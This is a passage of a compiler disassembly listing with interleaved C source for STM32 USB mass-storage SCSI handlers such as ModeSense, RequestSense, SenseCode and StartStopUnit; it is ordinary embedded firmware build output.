 8009f16:	2208      	movs	r2, #8
 8009f18:	74da      	strb	r2, [r3, #19]
  hmsc->bot_data[4] = (uint8_t)((blk_nbr - 1U) >> 24);
 8009f1a:	693b      	ldr	r3, [r7, #16]
 8009f1c:	3b01      	subs	r3, #1
 8009f1e:	0e1b      	lsrs	r3, r3, #24
 8009f20:	b2da      	uxtb	r2, r3
 8009f22:	69bb      	ldr	r3, [r7, #24]
 8009f24:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((blk_nbr - 1U) >> 16);
 8009f26:	693b      	ldr	r3, [r7, #16]
 8009f28:	3b01      	subs	r3, #1
 8009f2a:	0c1b      	lsrs	r3, r3, #16
 8009f2c:	b2da      	uxtb	r2, r3
 8009f2e:	69bb      	ldr	r3, [r7, #24]
 8009f30:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((blk_nbr - 1U) >>  8);
 8009f32:	693b      	ldr	r3, [r7, #16]
 8009f34:	3b01      	subs	r3, #1
 8009f36:	0a1b      	lsrs	r3, r3, #8
 8009f38:	b2da      	uxtb	r2, r3
 8009f3a:	69bb      	ldr	r3, [r7, #24]
 8009f3c:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(blk_nbr - 1U);
 8009f3e:	693b      	ldr	r3, [r7, #16]
 8009f40:	b2db      	uxtb	r3, r3
 8009f42:	3b01      	subs	r3, #1
 8009f44:	b2da      	uxtb	r2, r3
 8009f46:	69bb      	ldr	r3, [r7, #24]
 8009f48:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = 0x02U;
 8009f4a:	69bb      	ldr	r3, [r7, #24]
 8009f4c:	2202      	movs	r2, #2
 8009f4e:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(blk_size >>  16);
 8009f50:	8abb      	ldrh	r3, [r7, #20]
 8009f52:	141b      	asrs	r3, r3, #16
 8009f54:	b2da      	uxtb	r2, r3
 8009f56:	69bb      	ldr	r3, [r7, #24]
 8009f58:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(blk_size >>  8);
 8009f5a:	8abb      	ldrh	r3, [r7, #20]
 8009f5c:	0a1b      	lsrs	r3, r3, #8
 8009f5e:	b29b      	uxth	r3, r3
 8009f60:	b2da      	uxtb	r2, r3
 8009f62:	69bb      	ldr	r3, [r7, #24]
 8009f64:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(blk_size);
 8009f66:	8abb      	ldrh	r3, [r7, #20]
 8009f68:	b2da      	uxtb	r2, r3
 8009f6a:	69bb      	ldr	r3, [r7, #24]
 8009f6c:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = 12U;
 8009f6e:	69bb      	ldr	r3, [r7, #24]
 8009f70:	220c      	movs	r2, #12
 8009f72:	60da      	str	r2, [r3, #12]

  return 0;
 8009f74:	2300      	movs	r3, #0
}
 8009f76:	4618      	mov	r0, r3
 8009f78:	3720      	adds	r7, #32
 8009f7a:	46bd      	mov	sp, r7
 8009f7c:	bd80      	pop	{r7, pc}
	...

08009f80 <SCSI_ModeSense6>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense6(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009f80:	b580      	push	{r7, lr}
 8009f82:	b086      	sub	sp, #24
 8009f84:	af00      	add	r7, sp, #0
 8009f86:	60f8      	str	r0, [r7, #12]
 8009f88:	460b      	mov	r3, r1
 8009f8a:	607a      	str	r2, [r7, #4]
 8009f8c:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009f8e:	68fb      	ldr	r3, [r7, #12]
 8009f90:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009f94:	68fb      	ldr	r3, [r7, #12]
 8009f96:	32b0      	adds	r2, #176	; 0xb0
 8009f98:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009f9c:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE6_LEN;
 8009f9e:	2317      	movs	r3, #23
 8009fa0:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 8009fa2:	693b      	ldr	r3, [r7, #16]
 8009fa4:	2b00      	cmp	r3, #0
 8009fa6:	d102      	bne.n	8009fae <SCSI_ModeSense6+0x2e>
  {
    return -1;
 8009fa8:	f04f 33ff 	mov.w	r3, #4294967295
 8009fac:	e011      	b.n	8009fd2 <SCSI_ModeSense6+0x52>
  }

  if (params[4] <= len)
 8009fae:	687b      	ldr	r3, [r7, #4]
 8009fb0:	3304      	adds	r3, #4
 8009fb2:	781b      	ldrb	r3, [r3, #0]
 8009fb4:	b29b      	uxth	r3, r3
 8009fb6:	8afa      	ldrh	r2, [r7, #22]
 8009fb8:	429a      	cmp	r2, r3
 8009fba:	d303      	bcc.n	8009fc4 <SCSI_ModeSense6+0x44>
  {
    len = params[4];
 8009fbc:	687b      	ldr	r3, [r7, #4]
 8009fbe:	3304      	adds	r3, #4
 8009fc0:	781b      	ldrb	r3, [r3, #0]
 8009fc2:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense6_data, len);
 8009fc4:	8afb      	ldrh	r3, [r7, #22]
 8009fc6:	461a      	mov	r2, r3
 8009fc8:	4904      	ldr	r1, [pc, #16]	; (8009fdc <SCSI_ModeSense6+0x5c>)
 8009fca:	6938      	ldr	r0, [r7, #16]
 8009fcc:	f000 feb8 	bl	800ad40 <SCSI_UpdateBotData>

  return 0;
 8009fd0:	2300      	movs	r3, #0
}
 8009fd2:	4618      	mov	r0, r3
 8009fd4:	3718      	adds	r7, #24
 8009fd6:	46bd      	mov	sp, r7
 8009fd8:	bd80      	pop	{r7, pc}
 8009fda:	bf00      	nop
 8009fdc:	2000011c 	.word	0x2000011c

08009fe0 <SCSI_ModeSense10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009fe0:	b580      	push	{r7, lr}
 8009fe2:	b086      	sub	sp, #24
 8009fe4:	af00      	add	r7, sp, #0
 8009fe6:	60f8      	str	r0, [r7, #12]
 8009fe8:	460b      	mov	r3, r1
 8009fea:	607a      	str	r2, [r7, #4]
 8009fec:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009fee:	68fb      	ldr	r3, [r7, #12]
 8009ff0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009ff4:	68fb      	ldr	r3, [r7, #12]
 8009ff6:	32b0      	adds	r2, #176	; 0xb0
 8009ff8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009ffc:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE10_LEN;
 8009ffe:	231b      	movs	r3, #27
 800a000:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a002:	693b      	ldr	r3, [r7, #16]
 800a004:	2b00      	cmp	r3, #0
 800a006:	d102      	bne.n	800a00e <SCSI_ModeSense10+0x2e>
  {
    return -1;
 800a008:	f04f 33ff 	mov.w	r3, #4294967295
 800a00c:	e011      	b.n	800a032 <SCSI_ModeSense10+0x52>
  }

  if (params[8] <= len)
 800a00e:	687b      	ldr	r3, [r7, #4]
 800a010:	3308      	adds	r3, #8
 800a012:	781b      	ldrb	r3, [r3, #0]
 800a014:	b29b      	uxth	r3, r3
 800a016:	8afa      	ldrh	r2, [r7, #22]
 800a018:	429a      	cmp	r2, r3
 800a01a:	d303      	bcc.n	800a024 <SCSI_ModeSense10+0x44>
  {
    len = params[8];
 800a01c:	687b      	ldr	r3, [r7, #4]
 800a01e:	3308      	adds	r3, #8
 800a020:	781b      	ldrb	r3, [r3, #0]
 800a022:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense10_data, len);
 800a024:	8afb      	ldrh	r3, [r7, #22]
 800a026:	461a      	mov	r2, r3
 800a028:	4904      	ldr	r1, [pc, #16]	; (800a03c <SCSI_ModeSense10+0x5c>)
 800a02a:	6938      	ldr	r0, [r7, #16]
 800a02c:	f000 fe88 	bl	800ad40 <SCSI_UpdateBotData>

  return 0;
 800a030:	2300      	movs	r3, #0
}
 800a032:	4618      	mov	r0, r3
 800a034:	3718      	adds	r7, #24
 800a036:	46bd      	mov	sp, r7
 800a038:	bd80      	pop	{r7, pc}
 800a03a:	bf00      	nop
 800a03c:	20000134 	.word	0x20000134

0800a040 <SCSI_RequestSense>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_RequestSense(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a040:	b580      	push	{r7, lr}
 800a042:	b086      	sub	sp, #24
 800a044:	af00      	add	r7, sp, #0
 800a046:	60f8      	str	r0, [r7, #12]
 800a048:	460b      	mov	r3, r1
 800a04a:	607a      	str	r2, [r7, #4]
 800a04c:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  uint8_t i;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a04e:	68fb      	ldr	r3, [r7, #12]
 800a050:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a054:	68fb      	ldr	r3, [r7, #12]
 800a056:	32b0      	adds	r2, #176	; 0xb0
 800a058:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a05c:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 800a05e:	693b      	ldr	r3, [r7, #16]
 800a060:	2b00      	cmp	r3, #0
 800a062:	d102      	bne.n	800a06a <SCSI_RequestSense+0x2a>
  {
    return -1;
 800a064:	f04f 33ff 	mov.w	r3, #4294967295
 800a068:	e080      	b.n	800a16c <SCSI_RequestSense+0x12c>
  }

  if (hmsc->cbw.dDataLength == 0U)
 800a06a:	693b      	ldr	r3, [r7, #16]
 800a06c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a070:	699b      	ldr	r3, [r3, #24]
 800a072:	2b00      	cmp	r3, #0
 800a074:	d10b      	bne.n	800a08e <SCSI_RequestSense+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a076:	693b      	ldr	r3, [r7, #16]
 800a078:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a07c:	7f59      	ldrb	r1, [r3, #29]
 800a07e:	2320      	movs	r3, #32
 800a080:	2205      	movs	r2, #5
 800a082:	68f8      	ldr	r0, [r7, #12]
 800a084:	f000 f876 	bl	800a174 <SCSI_SenseCode>
    return -1;
 800a088:	f04f 33ff 	mov.w	r3, #4294967295
 800a08c:	e06e      	b.n	800a16c <SCSI_RequestSense+0x12c>
  }

  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a08e:	2300      	movs	r3, #0
 800a090:	75fb      	strb	r3, [r7, #23]
 800a092:	e007      	b.n	800a0a4 <SCSI_RequestSense+0x64>
  {
    hmsc->bot_data[i] = 0U;
 800a094:	7dfb      	ldrb	r3, [r7, #23]
 800a096:	693a      	ldr	r2, [r7, #16]
 800a098:	4413      	add	r3, r2
 800a09a:	2200      	movs	r2, #0
 800a09c:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a09e:	7dfb      	ldrb	r3, [r7, #23]
 800a0a0:	3301      	adds	r3, #1
 800a0a2:	75fb      	strb	r3, [r7, #23]
 800a0a4:	7dfb      	ldrb	r3, [r7, #23]
 800a0a6:	2b11      	cmp	r3, #17
 800a0a8:	d9f4      	bls.n	800a094 <SCSI_RequestSense+0x54>
  }

  hmsc->bot_data[0] = 0x70U;
 800a0aa:	693b      	ldr	r3, [r7, #16]
 800a0ac:	2270      	movs	r2, #112	; 0x70
 800a0ae:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[7] = REQUEST_SENSE_DATA_LEN - 6U;
 800a0b0:	693b      	ldr	r3, [r7, #16]
 800a0b2:	220c      	movs	r2, #12
 800a0b4:	75da      	strb	r2, [r3, #23]

  if ((hmsc->scsi_sense_head != hmsc->scsi_sense_tail))
 800a0b6:	693b      	ldr	r3, [r7, #16]
 800a0b8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a0bc:	f893 2060 	ldrb.w	r2, [r3, #96]	; 0x60
 800a0c0:	693b      	ldr	r3, [r7, #16]
 800a0c2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a0c6:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a0ca:	429a      	cmp	r2, r3
 800a0cc:	d03f      	beq.n	800a14e <SCSI_RequestSense+0x10e>
  {
    hmsc->bot_data[2] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].Skey;
 800a0ce:	693b      	ldr	r3, [r7, #16]
 800a0d0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a0d4:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a0d8:	461a      	mov	r2, r3
 800a0da:	693b      	ldr	r3, [r7, #16]
 800a0dc:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a0e0:	f813 2032 	ldrb.w	r2, [r3, r2, lsl #3]
 800a0e4:	693b      	ldr	r3, [r7, #16]
 800a0e6:	749a      	strb	r2, [r3, #18]
    hmsc->bot_data[12] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASC;
 800a0e8:	693b      	ldr	r3, [r7, #16]
 800a0ea:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a0ee:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a0f2:	693a      	ldr	r2, [r7, #16]
 800a0f4:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a0f8:	00db      	lsls	r3, r3, #3
 800a0fa:	4413      	add	r3, r2
 800a0fc:	791a      	ldrb	r2, [r3, #4]
 800a0fe:	693b      	ldr	r3, [r7, #16]
 800a100:	771a      	strb	r2, [r3, #28]
    hmsc->bot_data[13] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASCQ;
 800a102:	693b      	ldr	r3, [r7, #16]
 800a104:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a108:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a10c:	693a      	ldr	r2, [r7, #16]
 800a10e:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a112:	00db      	lsls	r3, r3, #3
 800a114:	4413      	add	r3, r2
 800a116:	795a      	ldrb	r2, [r3, #5]
 800a118:	693b      	ldr	r3, [r7, #16]
 800a11a:	775a      	strb	r2, [r3, #29]
    hmsc->scsi_sense_head++;
 800a11c:	693b      	ldr	r3, [r7, #16]
 800a11e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a122:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a126:	3301      	adds	r3, #1
 800a128:	b2da      	uxtb	r2, r3
 800a12a:	693b      	ldr	r3, [r7, #16]
 800a12c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a130:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60

    if (hmsc->scsi_sense_head == SENSE_LIST_DEEPTH)
 800a134:	693b      	ldr	r3, [r7, #16]
 800a136:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a13a:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a13e:	2b04      	cmp	r3, #4
 800a140:	d105      	bne.n	800a14e <SCSI_RequestSense+0x10e>
    {
      hmsc->scsi_sense_head = 0U;
 800a142:	693b      	ldr	r3, [r7, #16]
 800a144:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a148:	2200      	movs	r2, #0
 800a14a:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
    }
  }

  hmsc->bot_data_length = REQUEST_SENSE_DATA_LEN;
 800a14e:	693b      	ldr	r3, [r7, #16]
 800a150:	2212      	movs	r2, #18
 800a152:	60da      	str	r2, [r3, #12]

  if (params[4] <= REQUEST_SENSE_DATA_LEN)
 800a154:	687b      	ldr	r3, [r7, #4]
 800a156:	3304      	adds	r3, #4
 800a158:	781b      	ldrb	r3, [r3, #0]
 800a15a:	2b12      	cmp	r3, #18
 800a15c:	d805      	bhi.n	800a16a <SCSI_RequestSense+0x12a>
  {
    hmsc->bot_data_length = params[4];
 800a15e:	687b      	ldr	r3, [r7, #4]
 800a160:	3304      	adds	r3, #4
 800a162:	781b      	ldrb	r3, [r3, #0]
 800a164:	461a      	mov	r2, r3
 800a166:	693b      	ldr	r3, [r7, #16]
 800a168:	60da      	str	r2, [r3, #12]
  }

  return 0;
 800a16a:	2300      	movs	r3, #0
}
 800a16c:	4618      	mov	r0, r3
 800a16e:	3718      	adds	r7, #24
 800a170:	46bd      	mov	sp, r7
 800a172:	bd80      	pop	{r7, pc}

0800a174 <SCSI_SenseCode>:
  * @param  ASC: Additional Sense Code
  * @retval none

  */
void SCSI_SenseCode(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t sKey, uint8_t ASC)
{
 800a174:	b480      	push	{r7}
 800a176:	b085      	sub	sp, #20
 800a178:	af00      	add	r7, sp, #0
 800a17a:	6078      	str	r0, [r7, #4]
 800a17c:	4608      	mov	r0, r1
 800a17e:	4611      	mov	r1, r2
 800a180:	461a      	mov	r2, r3
 800a182:	4603      	mov	r3, r0
 800a184:	70fb      	strb	r3, [r7, #3]
 800a186:	460b      	mov	r3, r1
 800a188:	70bb      	strb	r3, [r7, #2]
 800a18a:	4613      	mov	r3, r2
 800a18c:	707b      	strb	r3, [r7, #1]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a18e:	687b      	ldr	r3, [r7, #4]
 800a190:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a194:	687b      	ldr	r3, [r7, #4]
 800a196:	32b0      	adds	r2, #176	; 0xb0
 800a198:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a19c:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 800a19e:	68fb      	ldr	r3, [r7, #12]
 800a1a0:	2b00      	cmp	r3, #0
 800a1a2:	d03d      	beq.n	800a220 <SCSI_SenseCode+0xac>
  {
    return;
  }

  hmsc->scsi_sense[hmsc->scsi_sense_tail].Skey = sKey;
 800a1a4:	68fb      	ldr	r3, [r7, #12]
 800a1a6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1aa:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a1ae:	461a      	mov	r2, r3
 800a1b0:	68fb      	ldr	r3, [r7, #12]
 800a1b2:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a1b6:	78b9      	ldrb	r1, [r7, #2]
 800a1b8:	f803 1032 	strb.w	r1, [r3, r2, lsl #3]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASC = ASC;
 800a1bc:	68fb      	ldr	r3, [r7, #12]
 800a1be:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1c2:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a1c6:	68fa      	ldr	r2, [r7, #12]
 800a1c8:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a1cc:	00db      	lsls	r3, r3, #3
 800a1ce:	4413      	add	r3, r2
 800a1d0:	787a      	ldrb	r2, [r7, #1]
 800a1d2:	711a      	strb	r2, [r3, #4]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASCQ = 0U;
 800a1d4:	68fb      	ldr	r3, [r7, #12]
 800a1d6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1da:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a1de:	68fa      	ldr	r2, [r7, #12]
 800a1e0:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a1e4:	00db      	lsls	r3, r3, #3
 800a1e6:	4413      	add	r3, r2
 800a1e8:	2200      	movs	r2, #0
 800a1ea:	715a      	strb	r2, [r3, #5]
  hmsc->scsi_sense_tail++;
 800a1ec:	68fb      	ldr	r3, [r7, #12]
 800a1ee:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1f2:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a1f6:	3301      	adds	r3, #1
 800a1f8:	b2da      	uxtb	r2, r3
 800a1fa:	68fb      	ldr	r3, [r7, #12]
 800a1fc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a200:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61

  if (hmsc->scsi_sense_tail == SENSE_LIST_DEEPTH)
 800a204:	68fb      	ldr	r3, [r7, #12]
 800a206:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a20a:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a20e:	2b04      	cmp	r3, #4
 800a210:	d107      	bne.n	800a222 <SCSI_SenseCode+0xae>
  {
    hmsc->scsi_sense_tail = 0U;
 800a212:	68fb      	ldr	r3, [r7, #12]
 800a214:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a218:	2200      	movs	r2, #0
 800a21a:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
 800a21e:	e000      	b.n	800a222 <SCSI_SenseCode+0xae>
    return;
 800a220:	bf00      	nop
  }
}
 800a222:	3714      	adds	r7, #20
 800a224:	46bd      	mov	sp, r7
 800a226:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a22a:	4770      	bx	lr

0800a22c <SCSI_StartStopUnit>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_StartStopUnit(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a22c:	b580      	push	{r7, lr}
 800a22e:	b086      	sub	sp, #24
 800a230:	af00      	add	r7, sp, #0
 800a232:	60f8      	str	r0, [r7, #12]
 800a234:	460b      	mov	r3, r1
 800a236:	607a      	str	r2, [r7, #4]
 800a238:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a23a:	68fb      	ldr	r3, [r7, #12]
 800a23c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a240:	68fb      	ldr	r3, [r7, #12]
 800a242:	32b0      	adds	r2, #176	; 0xb0
 800a244:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a248:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a24a:	697b      	ldr	r3, [r7, #20]
 800a24c:	2b00      	cmp	r3, #0
 800a24e:	d102      	bne.n	800a256 <SCSI_StartStopUnit+0x2a>
  {
    return -1;
 800a250:	f04f 33ff 	mov.w	r3, #4294967295
 800a254:	e043      	b.n	800a2de <SCSI_StartStopUnit+0xb2>
  }

  if ((hmsc->scsi_medium_state == SCSI_MEDIUM_LOCKED) && ((params[4] & 0x3U) == 2U))
 800a256:	697b      	ldr	r3, [r7, #20]
 800a258:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a25c:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a260:	2b01      	cmp	r3, #1
 800a262:	d10f      	bne.n	800a284 <SCSI_StartStopUnit+0x58>
 800a264:	687b      	ldr	r3, [r7, #4]
 800a266:	3304      	adds	r3, #4
 800a268:	781b      	ldrb	r3, [r3, #0]
 800a26a:	f003 0303 	and.w	r3, r3, #3
 800a26e:	2b02      	cmp	r3, #2
 800a270:	d108      	bne.n	800a284 <SCSI_StartStopUnit+0x58>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800a272:	7af9      	ldrb	r1, [r7, #11]
 800a274:	2324      	movs	r3, #36	; 0x24
 800a276:	2205      	movs	r2, #5
 800a278:	68f8      	ldr	r0, [r7, #12]
 800a27a:	f7ff ff7b 	bl	800a174 <SCSI_SenseCode>

    return -1;
 800a27e:	f04f 33ff 	mov.w	r3, #4294967295
 800a282:	e02c      	b.n	800a2de <SCSI_StartStopUnit+0xb2>
  }

  if ((params[4] & 0x3U) == 0x1U) /* START=1 */
 800a284:	687b      	ldr	r3, [r7, #4]
 800a286:	3304      	adds	r3, #4
 800a288:	781b      	ldrb	r3, [r3, #0]
 800a28a:	f003 0303 	and.w	r3, r3, #3
 800a28e:	2b01      	cmp	r3, #1
 800a290:	d106      	bne.n	800a2a0 <SCSI_StartStopUnit+0x74>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a292:	697b      	ldr	r3, [r7, #20]
 800a294:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a298:	2200      	movs	r2, #0
 800a29a:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a29e:	e01a      	b.n	800a2d6 <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x2U) /* START=0 and LOEJ Load Eject=1 */
 800a2a0:	687b      	ldr	r3, [r7, #4]
 800a2a2:	3304      	adds	r3, #4
 800a2a4:	781b      	ldrb	r3, [r3, #0]
 800a2a6:	f003 0303 	and.w	r3, r3, #3
 800a2aa:	2b02      	cmp	r3, #2
 800a2ac:	d106      	bne.n	800a2bc <SCSI_StartStopUnit+0x90>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_EJECTED;
 800a2ae:	697b      	ldr	r3, [r7, #20]
 800a2b0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2b4:	2202      	movs	r2, #2
 800a2b6:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a2ba:	e00c      	b.n	800a2d6 <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x3U) /* START=1 and LOEJ Load Eject=1 */
 800a2bc:	687b      	ldr	r3, [r7, #4]
 800a2be:	3304      	adds	r3, #4
 800a2c0:	781b      	ldrb	r3, [r3, #0]
 800a2c2:	f003 0303 	and.w	r3, r3, #3
 800a2c6:	2b03      	cmp	r3, #3
 800a2c8:	d105      	bne.n	800a2d6 <SCSI_StartStopUnit+0xaa>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a2ca:	697b      	ldr	r3, [r7, #20]
 800a2cc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2d0:	2200      	movs	r2, #0
 800a2d2:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }
  else
  {
    /* .. */
  }
  hmsc->bot_data_length = 0U;
 800a2d6:	697b      	ldr	r3, [r7, #20]
 800a2d8:	2200      	movs	r2, #0
 800a2da:	60da      	str	r2, [r3, #12]

  return 0;
 800a2dc:	2300      	movs	r3, #0
}
 800a2de:	4618      	mov	r0, r3
 800a2e0:	3718      	adds	r7, #24
 800a2e2:	46bd      	mov	sp, r7
 800a2e4:	bd80      	pop	{r7, pc}

0800a2e6 <SCSI_AllowPreventRemovable>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_AllowPreventRemovable(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a2e6:	b480      	push	{r7}
 800a2e8:	b087      	sub	sp, #28
 800a2ea:	af00      	add	r7, sp, #0
 800a2ec:	60f8      	str	r0, [r7, #12]
 800a2ee:	460b      	mov	r3, r1
 800a2f0:	607a      	str	r2, [r7, #4]
 800a2f2:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a2f4:	68fb      	ldr	r3, [r7, #12]
 800a2f6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a2fa:	68fb      	ldr	r3, [r7, #12]
 800a2fc:	32b0      	adds	r2, #176	; 0xb0
 800a2fe:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a302:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a304:	697b      	ldr	r3, [r7, #20]
 800a306:	2b00      	cmp	r3, #0
 800a308:	d102      	bne.n	800a310 <SCSI_AllowPreventRemovable+0x2a>
  {
    return -1;
 800a30a:	f04f 33ff 	mov.w	r3, #4294967295
 800a30e:	e015      	b.n	800a33c <SCSI_AllowPreventRemovable+0x56>
  }

  if (params[4] == 0U)
 800a310:	687b      	ldr	r3, [r7, #4]
 800a312:	3304      	adds	r3, #4
 800a314:	781b      	ldrb	r3, [r3, #0]
 800a316:	2b00      	cmp	r3, #0
 800a318:	d106      	bne.n	800a328 <SCSI_AllowPreventRemovable+0x42>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a31a:	697b      	ldr	r3, [r7, #20]
 800a31c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a320:	2200      	movs	r2, #0
 800a322:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
